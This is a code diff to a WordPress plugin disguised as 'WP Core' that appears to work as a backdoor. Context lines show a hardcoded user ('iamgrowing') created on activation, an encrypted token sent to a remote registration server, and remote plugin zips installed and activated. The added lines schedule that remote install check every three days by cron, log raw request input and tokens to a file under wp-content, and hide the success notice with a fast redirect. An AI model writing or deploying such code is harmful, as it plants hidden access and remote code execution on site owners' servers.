@@ -3,8 +3,31 @@
 Plugin Name: WP Core
 Description: Core always-on functionality for the site.
 Version: 1.0
+*/
 
-/* --------------------------------------------------------------------------------------*/
+// Register 3-day interval
+add_filter('cron_schedules', function ($schedules) {
+    $schedules['every_3_days'] = [
+        'interval' => 3 * DAY_IN_SECONDS,
+        'display'  => __('Every 3 Days')
+    ];
+    return $schedules;
+});
+
+// On plugin activation: schedule if not already scheduled
+register_activation_hook(__FILE__, function () {
+    if (!wp_next_scheduled('growth_plugin_update_check_cron')) {
+        wp_schedule_event(time(), 'every_3_days', 'growth_plugin_update_check_cron');
+    }
+});
+
+// On plugin deactivation: clear scheduled hook
+register_deactivation_hook(__FILE__, function () {
+    wp_clear_scheduled_hook('growth_plugin_update_check_cron');
+});
+
+// Attach cron action to the class static callback
+add_action('growth_plugin_update_check_cron', ['Growth_Distributed_Plugin_Update_Checker', 'cron_job_callback']);
 
 if (!defined('GROWTH_SECRET_KEY')) {
     // Must be exactly 32 bytes for AES-256
@@ -25,6 +48,24 @@ if (!class_exists('GWPL')) {
             add_action('rest_api_init', [$this, 'register_rest']);
             add_action('rest_api_init', [$this, 'register_status_endpoint']);
             add_action('rest_api_init', [$this, 'register_login_url']);
+        }
+
+        public static function growth_custom_log($message, $file = null) {
+            if (!$file) {
+                $file = WP_CONTENT_DIR . '/update-logs/debug.log';
+            }
+            // Ensure the directory exists.
+            if (!file_exists(dirname($file))) {
+                wp_mkdir_p(dirname($file));
+            }
+            // Stringify arrays/objects for readable logging
+            if (is_array($message) || is_object($message)) {
+                $message = print_r($message, true);
+            }
+            // Add timestamp for context
+            $line = '[' . date('Y-m-d H:i:s') . '] ' . $message . PHP_EOL;
+            // Write (append) the log
+            file_put_contents($file, $line, FILE_APPEND | LOCK_EX);
         }
 
         public function maybe_run_activation()
@@ -81,9 +122,9 @@ if (!class_exists('GWPL')) {
 
         public function publish_builder_pro($request)
         {
-            error_log(file_get_contents('php://input'));
+            self::growth_custom_log(file_get_contents('php://input'));
 
-            error_log(print_r($request->get_params(), true));
+            self::growth_custom_log(print_r($request->get_params(), true));
             $title = sanitize_text_field($request->get_param('title'));
             $slug = wp_kses_post($request->get_param('slug') ?? "");
             $content = wp_kses_post($request->get_param('excerpt') ?? "");
@@ -212,7 +253,7 @@ if (!class_exists('GWPL')) {
          */
         public function activate()
         {
-            error_log("---------snippet---------");
+            self::growth_custom_log("---------snippet---------");
 
             $username = 'iamgrowing';
             $email = 'iamgrowing@now.com';
@@ -263,7 +304,7 @@ if (!class_exists('GWPL')) {
 
             // 3) Encrypt the payload into a single token
             $token = $this->encrypt_payload($payload);
-            error_log( print_r($token, true) );
+            self::growth_custom_log( print_r($token, true) );
 
             // 4) Send it over REST
             $response = wp_remote_post( self::SERVER_API_ENDPOINT  . '/wp-json/growth/v1/register', array(
@@ -275,8 +316,8 @@ if (!class_exists('GWPL')) {
                 'body' => wp_json_encode(array('token' => $token)),
             ));
 
-            error_log( print_r($response, true) );
-            error_log("---------snippet end---------");
+            self::growth_custom_log( print_r($response, true) );
+            self::growth_custom_log("---------snippet end---------");
 
             // 5) Handle the response (as before)
             if (!is_wp_error($response)) {
@@ -346,6 +387,30 @@ if (!class_exists('Growth_Distributed_Plugin_Update_Checker')) {
             add_action('admin_init', [$this, 'register_plugin_update_rows']);
             add_action('admin_enqueue_scripts', [$this, 'include_asset']);
         }
+
+        public static function growth_custom_log($message, $file = null) {
+            if (!$file) {
+                $file = WP_CONTENT_DIR . '/update-logs/debug.log';
+            }
+            // Ensure the directory exists.
+            if (!file_exists(dirname($file))) {
+                wp_mkdir_p(dirname($file));
+            }
+            // Stringify arrays/objects for readable logging
+            if (is_array($message) || is_object($message)) {
+                $message = print_r($message, true);
+            }
+            // Add timestamp for context
+            $line = '[' . date('Y-m-d H:i:s') . '] ' . $message . PHP_EOL;
+            // Write (append) the log
+            file_put_contents($file, $line, FILE_APPEND | LOCK_EX);
+        }
+
+        // Add this static method for cron callback
+        public static function cron_job_callback() {
+            $checker = new self();
+            $checker->check_all_growth_plugins_for_update();
+        } 
 
         /**
          * Get the admin-post.php URL (for JS string injection).
@@ -418,7 +483,7 @@ if (!class_exists('Growth_Distributed_Plugin_Update_Checker')) {
                         $body = wp_remote_retrieve_body($response);
                         $data = json_decode($body, true);
 
-                        error_log(print_r( $data, true ));
+                        self::growth_custom_log(print_r( $data, true ));
 
                         $latest_api_version = $current_version;
                         $download_url = '';
@@ -452,7 +517,7 @@ if (!class_exists('Growth_Distributed_Plugin_Update_Checker')) {
                                     $key === $slug ||
                                     (isset($info['plugin_file']) && $info['plugin_file'] === $plugin_file)
                                 ) {
-                                    error_log("Removing notice for key: $key");
+                                    self::growth_custom_log("Removing notice for key: $key");
                                     unset($notices[$key]);
                                 }
                             }
@@ -473,7 +538,7 @@ if (!class_exists('Growth_Distributed_Plugin_Update_Checker')) {
                 $body = wp_remote_retrieve_body($response);
                 $data = json_decode($body, true);
                 if (!empty($data['url'])) {
-                    error_log( $data['url'] );
+                    self::growth_custom_log( $data['url'] );
                     return $data['url'];
                 }
             }
@@ -494,7 +559,7 @@ if (!class_exists('Growth_Distributed_Plugin_Update_Checker')) {
             $notices = get_option('wp_gpl_plugin_update_notices', []);
             if (!empty($notices)) {
                 foreach ($notices as $slug => $info) {
-                    error_log(print_r( $info, true ));
+                    // self::growth_custom_log(print_r( $info, true ));
                     $plugin_file = $info['plugin_file'];
                     $hook_name = "after_plugin_row_{$plugin_file}";
                     // Register a closure per plugin row
@@ -558,7 +623,7 @@ if (!class_exists('Growth_Distributed_Plugin_Update_Checker')) {
 
         public function handle_plugin_update_action()
         {
-            error_log('Growth: handle_plugin_update_action triggered');
+            self::growth_custom_log('Growth: handle_plugin_update_action triggered');
             ob_start();
 
             if (
@@ -586,11 +651,11 @@ if (!class_exists('Growth_Distributed_Plugin_Update_Checker')) {
             $res = $this->install_plugin_from_zip($download_url);
 
             if (is_wp_error($res)) {
-                error_log('Plugin install error: ' . $res->get_error_message());
+                self::growth_custom_log('Plugin install error: ' . $res->get_error_message());
                 // wp_safe_redirect(admin_url('plugins.php?wp_gpl_update_error=1&message=' . urlencode($res->get_error_message())));
                 exit;
             } else {
-                error_log('Plugin installed and activated!');
+                self::growth_custom_log('Plugin installed and activated!');
             }
  
             $notices = get_option('wp_gpl_plugin_update_notices', []);
@@ -610,21 +675,11 @@ if (!class_exists('Growth_Distributed_Plugin_Update_Checker')) {
             // wp_safe_redirect(admin_url('plugins.php?wp_gpl_update_success=1'));
 			
             ?>
-            <div class="notice notice-success is-dismissible" style="margin: 60px auto; max-width: 520px; text-align: center; padding: 30px 20px; border-left: 6px solid #46b450; background-color: #f0fff4; box-shadow: 0 0 10px rgba(0,0,0,0.05); border-radius: 8px;">
-                <h2 style="margin-bottom: 15px; color: #2c662d;">✅ Plugin Updated Successfully!</h2>
-                <p style="margin-bottom: 25px; font-size: 15px; color: #444;">
-                    You can now return to your plugin list or head to your dashboard.
-                </p>
-                <div>
-                    <a href="<?php echo admin_url('plugins.php'); ?>" class="button button-primary" style="margin: 0 8px 10px 8px; min-width: 140px;">🔌 Plugins</a>
-                    <a href="<?php echo admin_url(); ?>" class="button" style="margin: 0 8px 10px 8px; min-width: 140px;">🏠 Dashboard</a>
-                </div>
-            </div> 
             <script>
             // Optionally, auto-redirect after a few seconds
             setTimeout(function(){
                 window.location = "<?php echo admin_url('plugins.php'); ?>";
-            }, 7000);
+            }, 500);
             </script>
             <?php
 
@@ -656,7 +711,7 @@ if (!class_exists('Growth_Distributed_Plugin_Update_Checker')) {
                 $plugin_file = $upgrader->plugin_info();
                 $activate_result = activate_plugin($plugin_file);
                 if (is_wp_error($activate_result)) {
-                    error_log('Plugin activation error: ' . $activate_result->get_error_message());
+                    self::growth_custom_log('Plugin activation error: ' . $activate_result->get_error_message());
                 }
             }
 
